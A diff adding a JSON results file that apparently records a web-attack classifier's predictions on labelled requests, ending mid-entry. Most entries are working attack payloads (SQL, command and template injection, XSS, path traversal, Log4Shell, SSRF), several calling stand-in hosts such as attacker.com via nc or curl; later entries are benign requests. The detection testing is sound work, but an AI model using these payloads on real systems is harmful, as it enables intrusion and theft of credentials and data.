@@ -1,0 +1,1658 @@
+[
+  {
+    "category": "SQL Injection (Basic)",
+    "payload": "id=1' OR '1'='1",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9612,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (UNION-based)",
+    "payload": "id=1 UNION SELECT null, user(), database()--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9436,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Error-based)",
+    "payload": "id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9675,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Boolean Blind)",
+    "payload": "id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9649,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Time-based Blind)",
+    "payload": "id=1'; WAITFOR DELAY '0:0:5'--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9611,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Postgres Sleep)",
+    "payload": "id=1; SELECT pg_sleep(5)--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9256,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Hex Bypass)",
+    "payload": "id=0x27204f52202731273d2731",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9451,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Comment Obfuscation)",
+    "payload": "id=1'/**/OR/**/'1'='1",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9629,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Stacked Queries)",
+    "payload": "id=1; DROP TABLE users--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9461,
+    "correct": true
+  },
+  {
+    "category": "NoSQL Injection (MongoDB GT)",
+    "payload": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9422,
+    "correct": true
+  },
+  {
+    "category": "NoSQL Injection (Where Clause)",
+    "payload": "{\"$where\": \"this.user == 'admin'\"}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9556,
+    "correct": true
+  },
+  {
+    "category": "Reflected XSS",
+    "payload": "<script>alert('XSS')</script>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9798,
+    "correct": true
+  },
+  {
+    "category": "XSS via Image Attributes",
+    "payload": "<img src=x onerror=alert(1)>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9738,
+    "correct": true
+  },
+  {
+    "category": "XSS via SVG Path",
+    "payload": "<svg/onload=alert(1)>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.981,
+    "correct": true
+  },
+  {
+    "category": "XSS via Javascript Protocol",
+    "payload": "javascript:alert(1)",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9639,
+    "correct": true
+  },
+  {
+    "category": "XSS via Body Tag",
+    "payload": "<body onload=alert(1)>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9702,
+    "correct": true
+  },
+  {
+    "category": "XSS with Double Encoding",
+    "payload": "%253cscript%253ealert(1)%253c/script%253e",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9841,
+    "correct": true
+  },
+  {
+    "category": "XSS via Iframe srcdoc",
+    "payload": "<iframe srcdoc=\"<script>alert(1)</script>\">",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9716,
+    "correct": true
+  },
+  {
+    "category": "XSS via HTML5 Vector",
+    "payload": "<video><source onerror=\"alert(1)\">",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9702,
+    "correct": true
+  },
+  {
+    "category": "XSS via Tabbed Protocol",
+    "payload": "java\\tscript:alert(1)",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9581,
+    "correct": true
+  },
+  {
+    "category": "Command Injection (Basic)",
+    "payload": "; cat /etc/passwd",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.8997,
+    "correct": true
+  },
+  {
+    "category": "Command Injection (Piping)",
+    "payload": "| id",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.961,
+    "correct": true
+  },
+  {
+    "category": "Command Injection (Subshell)",
+    "payload": "$(whoami)",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.965,
+    "correct": true
+  },
+  {
+    "category": "Command Injection (Backticks)",
+    "payload": "`uname -a`",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9605,
+    "correct": true
+  },
+  {
+    "category": "Command Injection (Logical OR)",
+    "payload": "|| ls -la",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9689,
+    "correct": true
+  },
+  {
+    "category": "Command Injection (New line)",
+    "payload": "%0als",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9629,
+    "correct": true
+  },
+  {
+    "category": "Path Traversal (Basic)",
+    "payload": "../../../../etc/passwd",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9733,
+    "correct": true
+  },
+  {
+    "category": "Path Traversal (Null Byte)",
+    "payload": "../../../../etc/passwd%00",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9773,
+    "correct": true
+  },
+  {
+    "category": "Path Traversal (URL Encoded)",
+    "payload": "..%2f..%2f..%2fetc%2fshadow",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9635,
+    "correct": true
+  },
+  {
+    "category": "Path Traversal (Double URL Enc)",
+    "payload": "..%252f..%252f..%252fetc%252fhosts",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9473,
+    "correct": true
+  },
+  {
+    "category": "Local File Inclusion (PHP Filter)",
+    "payload": "php://filter/convert.base64-encode/resource=index.php",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9519,
+    "correct": true
+  },
+  {
+    "category": "Local File Inclusion (Input Wrapper)",
+    "payload": "php://input",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9655,
+    "correct": true
+  },
+  {
+    "category": "Remote File Inclusion",
+    "payload": "http://attacker.com/shell.txt",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9784,
+    "correct": true
+  },
+  {
+    "category": "Server-Side Request Forgery (Metadata)",
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9712,
+    "correct": true
+  },
+  {
+    "category": "Server-Side Request Forgery (Localhost)",
+    "payload": "http://127.0.0.1:22",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9725,
+    "correct": true
+  },
+  {
+    "category": "XML External Entity (XXE)",
+    "payload": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9679,
+    "correct": true
+  },
+  {
+    "category": "SSTI (Jinja2)",
+    "payload": "{{7*7}} or {{config.items()}}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9639,
+    "correct": true
+  },
+  {
+    "category": "SSTI (Mako)",
+    "payload": "${os.system('id')}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9711,
+    "correct": true
+  },
+  {
+    "category": "Log4Shell Payload",
+    "payload": "${jndi:ldap://attacker.com/a}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9718,
+    "correct": true
+  },
+  {
+    "category": "Shellshock",
+    "payload": "() { :;}; echo \"NS:\" $(/usr/bin/id)",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9634,
+    "correct": true
+  },
+  {
+    "category": "LDAP Injection",
+    "payload": "admin*)(| (password=*))",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9426,
+    "correct": true
+  },
+  {
+    "category": "XPath Injection",
+    "payload": "' or '1'='1",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9661,
+    "correct": true
+  },
+  {
+    "category": "HTTP Parameter Pollution",
+    "payload": "id=1&id=2",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.954,
+    "correct": true
+  },
+  {
+    "category": "CRLF Injection",
+    "payload": "%0d%0aSet-Cookie: session=attacker",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9413,
+    "correct": true
+  },
+  {
+    "category": "Host Header Injection",
+    "payload": "Host: evil.com",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9349,
+    "correct": true
+  },
+  {
+    "category": "Prototype Pollution",
+    "payload": "__proto__[admin]=true",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9638,
+    "correct": true
+  },
+  {
+    "category": "Insecure Deserialization (Pickle)",
+    "payload": "cos\\nsystem\\n(S'id'\\ntR.",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9691,
+    "correct": true
+  },
+  {
+    "category": "GraphQL Introspection",
+    "payload": "query { __schema { types { name } } }",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9568,
+    "correct": true
+  },
+  {
+    "category": "JWT Manipulation (alg none)",
+    "payload": "{\"alg\":\"none\"}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9449,
+    "correct": true
+  },
+  {
+    "category": "Open Redirect",
+    "payload": "url=http://malicious.com",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9632,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Wait-for-Delay Bypass)",
+    "payload": "id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.977,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (OOB via DNS)",
+    "payload": "id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\\\a')))",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9568,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (In-band via XML)",
+    "payload": "id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9628,
+    "correct": true
+  },
+  {
+    "category": "XSS via SVG Template",
+    "payload": "<svg><script xlink:href=\"http://attacker.com/xss.js\"></script></svg>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9803,
+    "correct": true
+  },
+  {
+    "category": "XSS via Polyglot Payload",
+    "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\\\"/+/onmouseover=1/(f=prompt,f(1))//'>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9775,
+    "correct": true
+  },
+  {
+    "category": "XSS via Mutation (mXSS)",
+    "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9861,
+    "correct": true
+  },
+  {
+    "category": "XSS via Client-Side Template Injection",
+    "payload": "{{constructor.constructor('alert(1)')()}}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9664,
+    "correct": true
+  },
+  {
+    "category": "Path Traversal (UTF-8 Encoded)",
+    "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9765,
+    "correct": true
+  },
+  {
+    "category": "Path Traversal (Windows-specific ..\\)",
+    "payload": "..\\..\\..\\..\\windows\\system32\\config\\sam",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9753,
+    "correct": true
+  },
+  {
+    "category": "Path Traversal (Long Path Bypass)",
+    "payload": "//////////////////etc/passwd",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.977,
+    "correct": true
+  },
+  {
+    "category": "Command Injection (Environmental Variable)",
+    "payload": "; echo $USER | nc attacker.com 1234",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.954,
+    "correct": true
+  },
+  {
+    "category": "Command Injection (Globbing Bypass)",
+    "payload": "; /bin/c?t /e*c/p?sswd",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9116,
+    "correct": true
+  },
+  {
+    "category": "LFI via PHP Expect Wrapper",
+    "payload": "expect://id",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9557,
+    "correct": true
+  },
+  {
+    "category": "LFI via Phar Archive",
+    "payload": "phar://path/to/malicious.phar/shell.php",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9409,
+    "correct": true
+  },
+  {
+    "category": "RCE via Java RMI",
+    "payload": "rmi://attacker.com:1099/Exploit",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9679,
+    "correct": true
+  },
+  {
+    "category": "RCE via Python eval() in JSON",
+    "payload": "{\"name\": \"__import__('os').system('id')\"}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9478,
+    "correct": true
+  },
+  {
+    "category": "SSRF via Gopher Protocol",
+    "payload": "gopher://localhost:6379/_SET%20foo%20bar",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9382,
+    "correct": true
+  },
+  {
+    "category": "SSRF via Dict Protocol",
+    "payload": "dict://localhost:11211/stat",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9277,
+    "correct": true
+  },
+  {
+    "category": "XXE via Parametric Entities",
+    "payload": "<!ENTITY % payload SYSTEM \"file:///etc/passwd\"> %payload;",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9767,
+    "correct": true
+  },
+  {
+    "category": "XXE via XInclude",
+    "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></foo>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9744,
+    "correct": true
+  },
+  {
+    "category": "SSTI (Velocity)",
+    "payload": "#set($str=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9572,
+    "correct": true
+  },
+  {
+    "category": "SSTI (Smarty)",
+    "payload": "{smart_f_shell_exec('id')}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9609,
+    "correct": true
+  },
+  {
+    "category": "SSTI (Twice)",
+    "payload": "{{7*7}}{{ '7'*7 }}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.969,
+    "correct": true
+  },
+  {
+    "category": "HTTP Request Smuggling (CL.TE)",
+    "payload": "Transfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9517,
+    "correct": true
+  },
+  {
+    "category": "HTTP Request Smuggling (TE.CL)",
+    "payload": "Content-Length: 4\\r\\n\\r\\n1234",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9493,
+    "correct": true
+  },
+  {
+    "category": "HTTP Response Splitting",
+    "payload": "/index.php?name=Guest%0d%0aSet-Cookie: session=1",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9434,
+    "correct": true
+  },
+  {
+    "category": "LDAP Injection (Attr filter)",
+    "payload": "(&(uid=admin)(|(password=*)))",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9509,
+    "correct": true
+  },
+  {
+    "category": "XPath Injection (Function call)",
+    "payload": "' or string-length(name(.)) > 0 or '1'='1",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9671,
+    "correct": true
+  },
+  {
+    "category": "SMTP Injection (Header manipulation)",
+    "payload": "%0d%0aBcc: victim@example.com",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9154,
+    "correct": true
+  },
+  {
+    "category": "IMAP Injection",
+    "payload": "%0d%0a* CAPABILITY",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9511,
+    "correct": true
+  },
+  {
+    "category": "NoSQL Injection (JavaScript Execution $where)",
+    "payload": "{\"$where\": \"function() { return this.name == 'admin' }\"}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9731,
+    "correct": true
+  },
+  {
+    "category": "NoSQL Injection (Bitwise operations)",
+    "payload": "{\"id\": {\"$bitsAllSet\": [1, 5]}}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9278,
+    "correct": true
+  },
+  {
+    "category": "Prototype Pollution (Node.js)",
+    "payload": "{\"__proto__\": {\"isAdmin\": true}}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9634,
+    "correct": true
+  },
+  {
+    "category": "Object Injection (PHP)",
+    "payload": "O:8:\"Database\":1:{s:4:\"host\";s:9:\"localhost\";}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9709,
+    "correct": true
+  },
+  {
+    "category": "Insecure Deserialization (Java SerialVersionUID)",
+    "payload": "ac ed 00 05 73 72 00 12 ...",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9587,
+    "correct": true
+  },
+  {
+    "category": "Insecure Deserialization (.NET TypeNameHandling)",
+    "payload": "{\"$type\": \"System.Windows.Data.ObjectDataProvider, ...\"}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.954,
+    "correct": true
+  },
+  {
+    "category": "GraphQL Injection (Aliasing)",
+    "payload": "query { a: user(id:1) { name } b: user(id:2) { name } }",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9672,
+    "correct": true
+  },
+  {
+    "category": "GraphQL Injection (Batching)",
+    "payload": "[{\"query\": \"...\"}, {\"query\": \"...\"}]",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9693,
+    "correct": true
+  },
+  {
+    "category": "JWT Injection (Kid manipulation)",
+    "payload": "{\"alg\":\"RS256\",\"kid\":\"../../../../dev/null\",\"typ\":\"JWT\"}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9676,
+    "correct": true
+  },
+  {
+    "category": "JWT Injection (Jku redirection)",
+    "payload": "{\"alg\":\"RS256\",\"jku\":\"http://attacker.com/key.json\"}",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9764,
+    "correct": true
+  },
+  {
+    "category": "Clickjacking (X-Frame-Options bypass attempt)",
+    "payload": "<iframe src=\"https://target.com\" style=\"opacity:0.5\"></iframe>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9653,
+    "correct": true
+  },
+  {
+    "category": "Tabnabbing (target=\"_blank\" without noopener)",
+    "payload": "<a href=\"http://malicious.com\" target=\"_blank\">Click here</a>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9625,
+    "correct": true
+  },
+  {
+    "category": "Cache Poisoning Request",
+    "payload": "X-Forwarded-Host: attacker.com",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9544,
+    "correct": true
+  },
+  {
+    "category": "Slowloris Header Pattern",
+    "payload": "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 42\\r\\n",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.969,
+    "correct": true
+  },
+  {
+    "category": "BREACH Attack Payload",
+    "payload": "gzip compressed content with chosen prefix",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9391,
+    "correct": true
+  },
+  {
+    "category": "WebSocket Injection (Malformed frame)",
+    "payload": "\\x81\\xfe\\x00\\x00... (illegal length)",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9615,
+    "correct": true
+  },
+  {
+    "category": "Server-Side Request Forgery via PDF Generator",
+    "payload": "<iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe>",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9753,
+    "correct": true
+  },
+  {
+    "category": "Blind SQLi via User-Agent Header",
+    "payload": "User-Agent: ' OR SLEEP(5) OR '",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9301,
+    "correct": true
+  },
+  {
+    "category": "Path Traversal via ZIP Slip",
+    "payload": "../../../../tmp/shell.php (inside zip archive)",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.964,
+    "correct": true
+  },
+  {
+    "category": "RCE via Spring4Shell (CVE-2022-22965)",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9654,
+    "correct": true
+  },
+  {
+    "category": "Real user data capture",
+    "payload": "call=getRawDataFromDatabase&query=file:///etc/passwd",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.8891,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Wait-for-Delay Bypass)",
+    "payload": "id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.977,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (OOB via DNS)",
+    "payload": "id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9608,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (In-band via XML)",
+    "payload": "id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9628,
+    "correct": true
+  },
+  {
+    "category": "SQL Injection (Blind via Error Message)",
+    "payload": "id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9487,
+    "correct": true
+  },
+  {
+    "category": "Java Attack",
+    "payload": "adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.8585,
+    "correct": true
+  },
+  {
+    "category": "Homepage Access",
+    "payload": "GET /",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.561,
+    "correct": true
+  },
+  {
+    "category": "Static Asset (CSS)",
+    "payload": "GET /static/css/style.css",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.585,
+    "correct": true
+  },
+  {
+    "category": "Static Asset (JS)",
+    "payload": "GET /assets/js/bundle.min.js",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.6289,
+    "correct": true
+  },
+  {
+    "category": "Static Asset (Image)",
+    "payload": "GET /images/logo.png",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5167,
+    "correct": true
+  },
+  {
+    "category": "Static Asset (Favicon)",
+    "payload": "GET /favicon.ico",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.7097,
+    "correct": true
+  },
+  {
+    "category": "Robots.txt",
+    "payload": "GET /robots.txt",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5397,
+    "correct": true
+  },
+  {
+    "category": "Sitemap",
+    "payload": "GET /sitemap.xml",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5019,
+    "correct": true
+  },
+  {
+    "category": "Health Check",
+    "payload": "GET /health",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5346,
+    "correct": true
+  },
+  {
+    "category": "API Ping",
+    "payload": "GET /api/v1/ping",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8645,
+    "correct": true
+  },
+  {
+    "category": "Login Page Load",
+    "payload": "GET /login",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5528,
+    "correct": true
+  },
+  {
+    "category": "Search Query (Simple)",
+    "payload": "GET /search?q=security",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5576,
+    "correct": true
+  },
+  {
+    "category": "Search Query (Spaces)",
+    "payload": "GET /search?q=machine+learning",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5812,
+    "correct": true
+  },
+  {
+    "category": "Search Query (Symbols)",
+    "payload": "GET /search?q=C%23",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.552,
+    "correct": true
+  },
+  {
+    "category": "Search Query (Quote)",
+    "payload": "GET /search?q=O'Reilly",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5576,
+    "correct": true
+  },
+  {
+    "category": "Search Query (Math)",
+    "payload": "GET /search?q=1+1=2",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5557,
+    "correct": true
+  },
+  {
+    "category": "API GET (List Products)",
+    "payload": "GET /api/v1/products",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8724,
+    "correct": true
+  },
+  {
+    "category": "API GET (Single Product)",
+    "payload": "GET /api/v1/products/101",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8762,
+    "correct": true
+  },
+  {
+    "category": "API POST (Login)",
+    "payload": "POST /api/v1/login (username/password)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.87,
+    "correct": true
+  },
+  {
+    "category": "API POST (Submit Order)",
+    "payload": "POST /api/v1/orders (JSON payload)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8776,
+    "correct": true
+  },
+  {
+    "category": "API PUT (Update Profile)",
+    "payload": "PUT /api/v1/profile (JSON payload)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8747,
+    "correct": true
+  },
+  {
+    "category": "API PATCH (Update Setting)",
+    "payload": "PATCH /api/v1/settings/theme",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.853,
+    "correct": true
+  },
+  {
+    "category": "API DELETE (Remove Item)",
+    "payload": "DELETE /api/v1/cart/items/5",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8588,
+    "correct": true
+  },
+  {
+    "category": "Form Submit (Contact Us)",
+    "payload": "POST /contact (name, email, message)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5888,
+    "correct": true
+  },
+  {
+    "category": "Form Submit (Signup)",
+    "payload": "POST /register (detailed user info)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.546,
+    "correct": true
+  },
+  {
+    "category": "OAuth Auth Flow",
+    "payload": "GET /auth/google/callback",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5664,
+    "correct": true
+  },
+  {
+    "category": "Analytics Event",
+    "payload": "POST /collect?v=1&tid=UA-XXXXX",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.581,
+    "correct": true
+  },
+  {
+    "category": "Error Logging",
+    "payload": "POST /api/v1/logs/frontend (traceback)",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.8653,
+    "correct": true
+  },
+  {
+    "category": "User Profile View",
+    "payload": "GET /user/profile",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.526,
+    "correct": true
+  },
+  {
+    "category": "Dashboard Page",
+    "payload": "GET /dashboard?view=summary&time=30d",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5123,
+    "correct": true
+  },
+  {
+    "category": "Settings Navigation",
+    "payload": "GET /settings/security",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.5427,
+    "correct": true
+  },
+  {
+    "category": "Password Reset Request",
+    "payload": "POST /auth/password-reset-request",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
